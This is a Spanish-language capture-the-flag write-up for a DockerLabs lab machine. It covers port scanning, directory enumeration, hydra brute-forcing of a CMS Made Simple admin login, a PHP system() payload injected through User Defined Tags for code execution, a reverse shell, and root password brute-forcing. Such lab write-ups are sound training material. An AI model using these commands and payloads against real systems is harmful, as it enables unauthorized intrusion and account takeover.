@@ -1,0 +1,142 @@
+<p><img src="assets/logo-dockerlabs.png" alt="logodocker" /></p>
+
+<p>En este reto nos encontramos con escaneo de puertos para buscar una entrada al sistema  , enumeracion con con gobuster , explotacion de cve , revshell y escalada</p>
+
+<h2 id="herramientas-y-recursos-usados">Herramientas y recursos usados</h2>
+
+<ul>
+  <li>nmap</li>
+  <li>gobuster</li>
+  <li>hydra</li>
+  <li>cve</li>
+</ul>
+
+<h2 id="enumeracion">Enumeracion</h2>
+
+<p>Empezamos lanzando un nmap contra el objetivo .</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-p-</span> <span class="nt">-sS</span> <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">--min-rate</span><span class="o">=</span>5000 <span class="nt">-n</span> <span class="nt">-vvv</span> 172.17.0.2 <span class="nt">-oX</span> summervibes 
+</code></pre></div></div>
+<p><a href="/reporte/summervibes.html" title="reportesnmap">Reporte nmap</a></p>
+
+<p>Revisamos la web a ver que encontramos , buscamos en codigo fuente y encontramos lo siguiente.
+Asi que vamos a chusmear y de paso lanzamos un gobuster contra ese directorio.</p>
+
+<p><img src="assets/summervibes/fuenteweb.png" alt="funeteweb" /></p>
+
+<p>Vamos directos a gobuster</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster <span class="nt">-q</span> <span class="nb">dir</span> <span class="nt">-w</span> /usr/share/dirbuster/directory-list-2.3-medium.txt <span class="nt">-x</span> html,htm,php,txt,xml <span class="nt">-u</span> http://172.17.0.2/cmsms <span class="nt">--exclude-length</span> 3690
+</code></pre></div></div>
+
+<p><img src="assets/summervibes/gobuster.png" alt="gobuster" /></p>
+
+<p>Miramos la version del cms , espero no lo hayan editado para despistar.</p>
+
+<p><img src="assets/summervibes/cmsversion.png" alt="cmsversion" /></p>
+
+<p>En gobuster tambien vimos un directorio login para el admin , asi que investigamos en la web sobre este cms y como explotarlo.</p>
+
+<p><img src="assets/summervibes/cve.png" alt="cve" /></p>
+
+<p>Para poder abusar de este cms si o si y con cualquier cve asociado  necesitamos tener privilegios administrativos.
+Voy a probar contra admin con rockyou como dic y podemos usar hydra por ejemplo.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra <span class="nt">-l</span> admin <span class="nt">-P</span> ~/rockyou.txt 172.17.0.2 http-post-form <span class="s2">"/cmsms/admin/login.php:username=^USER^&amp;password=^PASS^&amp;&amp;loginsubmit=Submit:User name or password incorrect"</span> <span class="nt">-VI</span>
+</code></pre></div></div>
+
+<p><img src="assets/summervibes/passweb.png" alt="hydra" /></p>
+
+<h2 id="explotacion">Explotacion</h2>
+
+<p>Ahora que tenemos el user y pass vamos a explotar ese cve
+Nos vamos a la pagina de login y nos conectamos.
+Se nos muestra panel de administracion del cms , como no se como hacerlo paso a buscar como se realiza ese exploit.
+El que nos interesa es el rec y buscando encuentro.</p>
+
+<p><img src="assets/summervibes/exploitgithub.png" alt="exploit" /></p>
+
+<p>Sigo las instruciones y listo.</p>
+
+<blockquote>
+  <p>Log in as Administrator</p>
+</blockquote>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Access the CMS Made Simple admin panel and log in with administrator credentials.
+</code></pre></div></div>
+
+<p>Navigate to User Defined Tags</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Go to Extensions &gt; User Defined Tags.
+</code></pre></div></div>
+
+<p>Inject Payload</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>In the 'Code' text area, input the following payload:
+
+&lt;?php echo system('id'); ?&gt;
+
+This PHP code, when executed, will display the system user and group IDs.
+</code></pre></div></div>
+
+<p>Execute the Payload</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Click on the 'Run' button to execute the payload.
+</code></pre></div></div>
+
+<p>Observe the Output</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>The output should be similar to:
+
+uid=1000(admin) gid=1000(admin) groups=1000(admin) uid=1000(admin) gid=1000(admin) groups=1000(admin)
+</code></pre></div></div>
+
+<p>This indicates successful execution of the code, displaying the server process’s user and group IDs</p>
+
+<p>Despues de comprobar lo tipico id whoami me dispongo a lanzar una revshel no sin antes dejar netcat a la escucha.</p>
+
+<p><img src="assets/summervibes/exploit.png" alt="exploit" /></p>
+
+<h2 id="infiltracion">Infiltracion</h2>
+
+<p><img src="assets/summervibes/ncok.png" alt="nc" /></p>
+
+<p>Ya tenemos la revshell la configuramos y empezamos con lo facil y rapido , ni sudo, ni find nos da resultado , el cms  deberia de tener un bbdd pero no nos la mostro nmap y el cms ha de tener un config asi que buscamos primero el config.</p>
+
+<h2 id="escalada">Escalada</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-name</span> config.php 2&gt;/dev/null
+</code></pre></div></div>
+
+<p><img src="assets/summervibes/find.png" alt="find" /></p>
+
+<p>Buscamos el servico mysql.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ss
+</code></pre></div></div>
+
+<p><img src="assets/summervibes/ss.png" alt="ss" /></p>
+
+<p>Intento comprobar tambien con systemctl y ya me huelo medio raroporque me da error.</p>
+
+<p><img src="assets/summervibes/systemctl.png" alt="systemctl" /></p>
+
+<p>Vamos a intentar conectar a la base de datos con las credenciales de web</p>
+
+<p><img src="assets/summervibes/mysql.png" alt="conectbbdd" /></p>
+
+<p>A mi ya solo se me ocurre hacer fuerza bruta  asi me me dispongo a usar el script que hizo el pinguino.
+Me copio el script y el diccionario.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./suforce.sh root rockyou.txt
+</code></pre></div></div>
+<blockquote class="prompt-tip">
+  <p>Le modifique el timeout al script pq no lo pillada hice que fuese mas lento y que mala memoria la mia de no haber probado las contareñas que ya teniamos</p>
+</blockquote>
+
+<p><img src="assets/summervibes/contasenaroot.png" alt="roo" /></p>
+
+<blockquote class="prompt-tip">
+  <p>Ni con root entre en la bbdd</p>
+</blockquote>
+
+<p>Saludos y muchas gracias por leer</p>
